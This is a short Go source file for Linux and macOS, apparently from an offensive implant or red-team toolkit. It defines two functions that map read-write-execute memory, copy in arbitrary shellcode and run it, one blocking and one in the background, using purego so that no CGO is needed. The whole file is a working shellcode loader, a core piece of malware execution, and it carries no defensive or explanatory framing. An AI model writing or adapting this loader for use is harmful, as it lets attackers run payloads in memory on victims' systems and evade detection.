//go:build (linux || darwin) && !windows

// Pure Go shellcode injection via mmap + purego.SyscallN.
// No CGO required -- works with CGO_ENABLED=0.
package injection

import (
	"fmt"
	"runtime"
	"unsafe"

	"github.com/ebitengine/purego"
	"golang.org/x/sys/unix"
)

// InjectPureGo executes arbitrary shellcode in memory without CGO.
// Uses mmap(RWX) + purego.SyscallN to call the shellcode as a function.
// Blocks until shellcode finishes.
func InjectPureGo(shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("empty shellcode")
	}

	mem, err := unix.Mmap(
		-1, 0, len(shellcode),
		unix.PROT_READ|unix.PROT_WRITE|unix.PROT_EXEC,
		unix.MAP_PRIVATE|unix.MAP_ANONYMOUS,
	)
	if err != nil {
		return fmt.Errorf("mmap: %w", err)
	}
	defer unix.Munmap(mem)

	copy(mem, shellcode)

	errCh := make(chan error, 1)
	go func() {
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()
		fnptr := uintptr(unsafe.Pointer(&mem[0]))
		purego.SyscallN(fnptr)
		errCh <- nil
	}()

	return <-errCh
}

// InjectPureGoAsync executes shellcode without blocking.
// Returns immediately, shellcode runs in background.
func InjectPureGoAsync(shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("empty shellcode")
	}

	mem, err := unix.Mmap(
		-1, 0, len(shellcode),
		unix.PROT_READ|unix.PROT_WRITE|unix.PROT_EXEC,
		unix.MAP_PRIVATE|unix.MAP_ANONYMOUS,
	)
	if err != nil {
		return fmt.Errorf("mmap: %w", err)
	}
	// No Munmap -- memory freed when process exits

	copy(mem, shellcode)

	go func() {
		runtime.LockOSThread()
		fnptr := uintptr(unsafe.Pointer(&mem[0]))
		purego.SyscallN(fnptr)
	}()

	return nil
}
